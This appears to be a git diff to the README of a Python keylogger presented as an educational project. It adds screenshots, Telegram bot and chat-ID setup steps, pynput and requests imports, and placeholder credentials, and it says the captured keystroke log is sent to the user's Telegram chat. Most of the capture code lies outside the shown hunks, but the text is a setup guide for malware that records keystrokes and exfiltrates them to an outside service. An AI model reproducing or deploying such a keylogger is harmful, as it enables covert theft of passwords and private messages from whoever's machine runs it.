@@ -18,9 +18,15 @@ A simple Python keylogger designed for cybersecurity education and personal lear
 ## 📦 Requirements
 
 - Python 3.x
+- Telegram Account
+- Telegram Bot
 - Libraries:
   ```bash
   pip install pynput requests
+<p align="LEFT">
+  <img src="Screenshots/pynput install.jpg" width="800"/>
+</p>
+
 ---
 
 🤖 Setup Instructions
@@ -31,6 +37,9 @@ A simple Python keylogger designed for cybersecurity education and personal lear
     Send /newbot and follow the prompts
 
     Copy your Bot Token
+<p align="center">
+  <img src="Screenshots/Tele Bot Create.jpg" width="450"/>
+</p>
 
 2. Get Your Chat ID
 
@@ -42,14 +51,23 @@ A simple Python keylogger designed for cybersecurity education and personal lear
 
     Look for "chat": {"id": YOUR_CHAT_ID} in the JSON response
 
+<p align="center">
+  <img src="Screenshots/Chat ID.jpg" width="250"/>
+</p>
+
+
 🧪 Usage
 1. Save the script below as keylogger_telegram.py:
+<p align="center">
+  <img src="Screenshots/API + Chat ID .jpg" width="500"/>
+</p>
 
+```python
 import requests
 from pynput import keyboard
-```python
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-CHAT_ID = "YOUR_CHAT_ID_HERE"
+
+BOT_TOKEN = "TELEGRAM BOT API TOKEN"
+CHAT_ID = "CHATID"
 
 log = ""
 
@@ -89,7 +107,23 @@ python keylogger_telegram.py
 
     Press the Esc key
 
-    The full log will be sent to your Telegram chat
+    The full log will be sent to your Telegram chats
+
+<p align="center">
+  Desktop Notification
+</p>
+
+<p align="center">
+  <img src="Screenshots/Desktop Notif.jpg" width="400"/>
+</p>
+
+<p align="center">
+  Moblie Notification
+</p>
+
+<p align="center">
+  <img src="Screenshots/Mobile Notif.jpg" width="400"/>
+</p>
 
 🔒 Ethics & Legal Disclaimer
 
